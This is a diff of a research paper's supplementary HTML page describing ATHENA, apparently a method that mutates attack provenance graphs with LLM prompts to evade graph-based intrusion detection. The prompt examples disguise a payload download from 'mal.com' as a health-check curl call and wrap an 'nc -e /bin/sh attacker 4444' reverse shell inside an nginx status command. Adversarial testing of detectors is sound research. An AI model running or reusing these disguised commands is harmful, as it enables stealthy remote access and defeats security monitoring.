@@ -80,13 +80,13 @@ Supplementary content moved out of the main paper due to space limits.
 
 <h2 id="algo1">A. Algorithm 1 — Structural Mutation</h2>
 
-<p>Referenced from §IV.C "Structural Mutation" (L315–L333 of the main paper). The procedure has four stages: (1) Reference Graph Retrieval, (2) Aligned Region Search, (3) Subgraph Replacement, and (4) LLM-Guided Edge Mutation. The output is the structurally mutated graph <code>G̃</code>, on which semantic mutation (Section C of this supplementary) is then applied.</p>
+<p>Referenced from §IV.C "Structural Mutation" of the main paper. The procedure has four stages: (1) Reference Graph Retrieval, (2) Aligned Region Search, (3) Subgraph Replacement, and (4) LLM-Guided Edge Mutation. The output is the structurally mutated graph <code>G̃</code>, on which semantic mutation (Section C of this supplementary) is then applied.</p>
 
 <p><strong>Input</strong>: <code>G⁺ = (V, E)</code> (benign anchor graph), <code>𝒢⁻</code> (attack corpus), <code>N</code> (retrieval count), <code>r</code> (hop radius)</p>
 
 <p><strong>Output</strong>: structurally mutated graph <code>G̃ = (Ṽ, Ẽ)</code></p>
 
-<div class="algo">// Stage 1: Reference Graph Retrieval (Eq. (1) of the main paper)
+<div class="algo">// Stage 1: Reference Graph Retrieval
 1:  {G⁻_n} for n = 1..N  ←  Top-N over G⁻ in 𝒢⁻ by  K_WL(G⁺, G⁻)
 
 // Stage 2: Aligned Region Search
@@ -132,7 +132,7 @@ Supplementary content moved out of the main paper due to space limits.
 
 <h2 id="prompt1">B. Prompt Template — Edge Mutation</h2>
 
-<p>Referenced from §IV.C "LLM-Guided Edge Mutation" (L333 of the main paper). After subgraph replacement, boundary connections between the substituted attack subgraph <code>S′</code> and the benign context <code>C</code> still follow the original benign workflow around <code>S</code> and may introduce invalid or conspicuous cross-boundary operations. ATHENA <strong>restricts edge mutation to candidate edges between <code>S′</code> and <code>C</code></strong>; internal edges of <code>S′</code> (attack causal chain) and internal edges of <code>C</code> are not editable. For each candidate, the LLM decides whether to <strong>add</strong> a missing edge, <strong>remove</strong> an existing edge, or <strong>keep</strong> it unchanged.</p>
+<p>Referenced from §IV.C "LLM-Guided Edge Mutation" of the main paper. After subgraph replacement, boundary connections between the substituted attack subgraph <code>S′</code> and the benign context <code>C</code> still follow the original benign workflow around <code>S</code> and may introduce invalid or conspicuous cross-boundary operations. ATHENA <strong>restricts edge mutation to candidate edges between <code>S′</code> and <code>C</code></strong>; internal edges of <code>S′</code> (attack causal chain) and internal edges of <code>C</code> are not editable. For each candidate, the LLM decides whether to <strong>add</strong> a missing edge, <strong>remove</strong> an existing edge, or <strong>keep</strong> it unchanged.</p>
 
 <div class="prompt">
 <div class="title">Prompt: Edge Mutation</div>
@@ -156,14 +156,14 @@ Supplementary content moved out of the main paper due to space limits.
 <br><span class="label">[Output]</span>
 <br>JSON: <code>[{edge_id, action: ADD|REMOVE|KEEP, reason}]</code>.
 
-<br><br><strong>Example</strong> (<em>Fig. 3 in the main paper</em>). Substitution inherits a <code>write</code> edge from the file node <code>/usr/bin/sshd</code> in <code>S'</code> to <code>syslog</code> in <code>C</code>. Action: <code>REMOVE</code>. Reason: a direct file-to-file write would require an additional process-mediated injection path (e.g., reflective loading) to be feasible.
+<br><br><strong>Example.</strong> Substitution inherits a <code>write</code> edge from the file node <code>/usr/bin/sshd</code> in <code>S'</code> to <code>syslog</code> in <code>C</code>. Action: <code>REMOVE</code>. Reason: a direct file-to-file write would require an additional process-mediated injection path (e.g., reflective loading) to be feasible.
 </div>
 
 <h2 id="prompt2">C. Prompt Templates — Semantic Mutation</h2>
 
-<p>Referenced from §IV.C "Semantic Mutation" (L350–L356 of the main paper). Semantic mutation modifies process command names and arguments to blend them into the surrounding benign context. Following the paper, ATHENA pre-classifies each process node as one of three cases (Replacement, Rewriting, Extension) based on whether its command name and arguments are observed in the historical benign provenance graphs; <strong>this classification is performed by ATHENA, not by the LLM</strong>, since the full benign history cannot fit in a prompt. ATHENA then dispatches to one of three strategy-specific prompts (C.1, C.2, C.3 below); each prompt contains only the per-node information the LLM needs.</p>
+<p>Referenced from §IV.C "Semantic Mutation" of the main paper. Semantic mutation modifies process command names and arguments to blend them into the surrounding benign context. Each process node is pre-classified as one of three cases (Replacement, Rewriting, Extension) based on whether its command name and arguments are observed in the historical benign provenance graphs; this classification is performed externally and not by the LLM, since the full benign history cannot fit in a prompt. The pipeline then dispatches to one of three strategy-specific prompts (C.1, C.2, C.3 below); each prompt contains only the per-node information the LLM needs.</p>
 
-<p>All three prompts share the same input/output interface, matching the main paper (L352): the LLM receives the process node's <strong>command name and arguments</strong> together with <strong><code>C</code> serialized as neighboring events</strong> in the typed-triple form <code>(src_type:attr, op, dst_type:attr)</code>, and outputs a <strong>rewritten command name with corresponding arguments</strong>. Downstream propagation to associated file/network node attributes is performed mechanically by ATHENA based on the rewritten command-line file paths and network endpoints, and is not part of the LLM output.</p>
+<p>All three prompts share the same input/output interface: the LLM receives the process node's <strong>command name and arguments</strong> together with <strong><code>C</code> serialized as neighboring events</strong> in the typed-triple form <code>(src_type:attr, op, dst_type:attr)</code>, and outputs a <strong>rewritten command name with corresponding arguments</strong>. Downstream propagation to associated file/network node attributes is performed mechanically based on the rewritten command-line file paths and network endpoints, and is not part of the LLM output.</p>
 
 <h3>C.1 Replacement Prompt</h3>
 
@@ -173,7 +173,7 @@ Supplementary content moved out of the main paper due to space limits.
 <div class="title">Prompt C.1: Replacement</div>
 
 <span class="label">[Context]</span>
-<br>The attack process node below has exactly one component (either the command name or the arguments) that ATHENA has marked as attack-specific and must be preserved verbatim; the other component is benign-compatible and must be replaced with values that blend into the surrounding context <code>C</code>.
+<br>The attack process node below has exactly one component (either the command name or the arguments) marked as attack-specific and must be preserved verbatim; the other component is benign-compatible and must be replaced with values that blend into the surrounding context <code>C</code>.
 
 <br><span class="label">[Input]</span>
 <br>Process node:
@@ -194,7 +194,7 @@ Supplementary content moved out of the main paper due to space limits.
 <br><span class="label">[Output]</span>
 <br>JSON: <code>{new_command_name, new_arguments}</code>.
 
-<br><br><strong>Example</strong> (<em>L354 of the main paper</em>). Input: <code>command_name="wget"</code>, <code>arguments="http://mal.com/pay.sh"</code>, <code>preserve="arguments"</code> (the malicious URL), <code>C</code> = web-monitoring routines. Output: <code>{new_command_name: "curl", new_arguments: "-H \"X-Health-Check: true\" http://mal.com/pay.sh"}</code> — the malicious URL appears as a routine monitoring target.
+<br><br><strong>Example.</strong> Input: <code>command_name="wget"</code>, <code>arguments="http://mal.com/pay.sh"</code>, <code>preserve="arguments"</code> (the malicious URL), <code>C</code> = web-monitoring routines. Output: <code>{new_command_name: "curl", new_arguments: "-H \"X-Health-Check: true\" http://mal.com/pay.sh"}</code> — the malicious URL appears as a routine monitoring target.
 </div>
 
 <h3>C.2 Rewriting Prompt</h3>
@@ -205,7 +205,7 @@ Supplementary content moved out of the main paper due to space limits.
 <div class="title">Prompt C.2: Rewriting</div>
 
 <span class="label">[Context]</span>
-<br>ATHENA has marked this attack process node as a Rewriting case: neither the command name nor the arguments is attack-specific in isolation. The full command may therefore be rewritten into a different expression that fits the surrounding benign context <code>C</code>; the attack causal chain remains intact via the structural mutation that placed this node.
+<br>For this attack process node, neither the command name nor the arguments is attack-specific in isolation. The full command may therefore be rewritten into a different expression that fits the surrounding benign context <code>C</code>; the attack causal chain remains intact via the structural mutation that placed this node.
 
 <br><span class="label">[Input]</span>
 <br>Process node:
@@ -225,7 +225,7 @@ Supplementary content moved out of the main paper due to space limits.
 <br><span class="label">[Output]</span>
 <br>JSON: <code>{new_command_name, new_arguments}</code>.
 
-<br><br><strong>Example</strong> (<em>L355 of the main paper</em>). Input: <code>command_name="python"</code>, <code>arguments="/tmp/script.py"</code>, <code>C</code> dominated by <code>nginx</code> processes. Output: <code>{new_command_name: "php", new_arguments: "/var/www/cgi-bin/handler.php"}</code> — matches the surrounding nginx context.
+<br><br><strong>Example.</strong> Input: <code>command_name="python"</code>, <code>arguments="/tmp/script.py"</code>, <code>C</code> dominated by <code>nginx</code> processes. Output: <code>{new_command_name: "php", new_arguments: "/var/www/cgi-bin/handler.php"}</code> — matches the surrounding nginx context.
 </div>
 
 <h3>C.3 Extension Prompt</h3>
@@ -236,7 +236,7 @@ Supplementary content moved out of the main paper due to space limits.
 <div class="title">Prompt C.3: Extension</div>
 
 <span class="label">[Context]</span>
-<br>ATHENA has marked this attack process node as an Extension case: both the command name and the arguments are attack-specific and must be preserved verbatim. The mutation extends the command by prepending and/or appending benign operations drawn from <code>C</code>, embedding the malicious command within a normal workflow.
+<br>For this attack process node, both the command name and the arguments are attack-specific and must be preserved verbatim. The mutation extends the command by prepending and/or appending benign operations drawn from <code>C</code>, embedding the malicious command within a normal workflow.
 
 <br><span class="label">[Input]</span>
 <br>Process node:
@@ -256,7 +256,7 @@ Supplementary content moved out of the main paper due to space limits.
 <br><span class="label">[Output]</span>
 <br>JSON: <code>{new_command_name, new_arguments}</code> &nbsp;(where <code>new_command_name</code> may be a shell builtin such as <code>sh -c</code> and <code>new_arguments</code> contains the full extended sequence).
 
-<br><br><strong>Example</strong> (<em>L356 of the main paper</em>). Input: <code>command_name="nc"</code>, <code>arguments="-e /bin/sh attacker 4444"</code>, <code>C</code> dominated by nginx admin checks. Output: <code>{new_command_name: "sh", new_arguments: "-c \"systemctl status nginx &amp;&amp; nc -e /bin/sh attacker 4444 &amp;&amp; echo \\\"connection test\\\"\""}</code> — the reverse shell appears as part of a network diagnostic routine.
+<br><br><strong>Example.</strong> Input: <code>command_name="nc"</code>, <code>arguments="-e /bin/sh attacker 4444"</code>, <code>C</code> dominated by nginx admin checks. Output: <code>{new_command_name: "sh", new_arguments: "-c \"systemctl status nginx &amp;&amp; nc -e /bin/sh attacker 4444 &amp;&amp; echo \\\"connection test\\\"\""}</code> — the reverse shell appears as part of a network diagnostic routine.
 </div>
 
 <h2 id="hyperparam">D. Additional Hyperparameter Analysis (GNN Layers and Embedding Dimension)</h2>
@@ -382,7 +382,7 @@ python -m vllm.entrypoints.openai.api_server \
 
 <h2 id="dataset">G. Annotated Dataset &amp; Source Code</h2>
 
-<p>Referenced from §V Setup (L603) and §V RQ3 setup (L666) in the main paper. Both the annotated dataset and the source code are released together for full reproducibility.</p>
+<p>Referenced from §V Setup and §V RQ3 setup of the main paper. Both the annotated dataset and the source code are released together for full reproducibility.</p>
 
 <p>The annotated APT detection dataset and the full ATHENA source code are released together at:</p>
 
